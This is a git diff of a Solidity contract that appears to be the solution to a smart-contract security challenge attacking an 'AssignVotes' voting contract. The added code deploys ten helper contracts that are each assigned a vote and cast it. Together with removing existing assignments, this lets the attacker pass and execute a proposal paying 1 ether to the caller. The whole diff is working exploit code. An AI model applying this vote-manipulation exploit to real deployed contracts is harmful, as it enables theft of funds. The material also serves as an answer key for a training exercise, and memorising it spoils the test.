@@ -3,6 +3,17 @@ pragma solidity 0.8.15;
 
 import "../AssignVotes.sol";
 
+contract AssignVotesSolHelper {
+    AssignVotes public victim;
+
+    constructor(AssignVotes victim_) {
+        victim = victim_;
+    }
+
+    function vote() public {
+        victim.vote(0);
+    }
+}
 contract AssignVotesSolution {
     AssignVotes public victim;
 
@@ -10,7 +21,8 @@ contract AssignVotesSolution {
         victim = victim_;
     }
 
-    function attack(address[] calldata signers) external {
+    //function attack(address[] calldata signers) external {
+    function attack() external {
         victim.createProposal(address(msg.sender), "", 1 ether);
 
         victim.removeAssignment(address(0x976EA74026E726554dB657fA54763abd0C3a0aa9));
@@ -20,7 +32,10 @@ contract AssignVotesSolution {
         victim.removeAssignment(address(0xBcd4042DE499D14e55001CcbB24a551F3b954096));
 
         for (uint i = 10; i < 20; i++) {
-            victim.assign(signers[i]);
+            AssignVotesSolHelper helper = new AssignVotesSolHelper(victim);
+            victim.assign(address(helper));
+            helper.vote();
         }
+        victim.execute(0);
     }
 }
